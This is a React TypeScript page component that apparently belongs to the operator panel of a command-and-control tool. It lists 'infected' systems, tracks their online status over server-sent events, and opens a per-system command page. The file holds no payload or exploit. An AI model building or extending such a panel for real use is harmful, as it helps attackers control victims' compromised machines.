import React, { useEffect, useState } from "react"
import { useLocation, useNavigate } from "react-router";
import type { Infected } from "../types/infected.ts";
import api from "../api/baseUrl.ts";
import { InfectedCard } from "../components/InfectedCard.tsx";
import { useTitle } from "../hooks/useTitle.ts";
import { useStore } from "../hooks/useStore.ts";

export const InfectedPage: React.FC = () => {
    const navigate = useNavigate();
    const { infected, setInfected } = useStore();
    useTitle("InfectedPage");

    /**
     * If the user is not authenticated, he will be redirected to /login
     */
    const obtainAllInfectedSystems = async () => {
        try {
            const response = await api.get("/infected/allInfected");
            setInfected(response.data as Infected[]);
            console.log(response.data)
        } catch (error) {
            localStorage.removeItem("isLoggedIn");

            setTimeout(() => {
                navigate("/login");
            }, 3000);
        }
    }

    const command = (infected: Infected) => {
        console.log(infected.latestIpAddress);
        if (infected.online){
            navigate(`/infected/${infected.iid}`)
        }
        else {
            console.log(`Infected ${infected.iid} is offline!`);
        }
    }

    /**
     * Checks if the user made login, before entering this page
     */

    useEffect(() => {
        const sse = new EventSource("/api/infected/sse/status");

        sse.addEventListener("status.updated", (e) => {
            const data = JSON.parse(e.data);
            setInfected(infected.map(infected => {
                if (infected.iid == data.iid) {
                    return {
                        ...infected,
                        online: data.online
                    }
                }

                return infected;
            }))
            console.log("Status updated:", data);
        })

        sse.onopen = () => console.log("SSE connected");
        sse.onerror = (e) => console.error("SSE error", e);

        const loggedIn = localStorage.getItem("isLoggedIn");
        if (!loggedIn) {
            navigate("/login");
            return;
        }
        obtainAllInfectedSystems();

        return () => {
            sse.close();
        }
    }, []);

    return (
        <>
            <div className="flex flex-row flex-wrap gap-4 p-4">
                {infected?.map((io) =>
                    (<InfectedCard infected={io} command={() => command(io)} key={io.iid} />))}
            </div>
        </>
    )
}
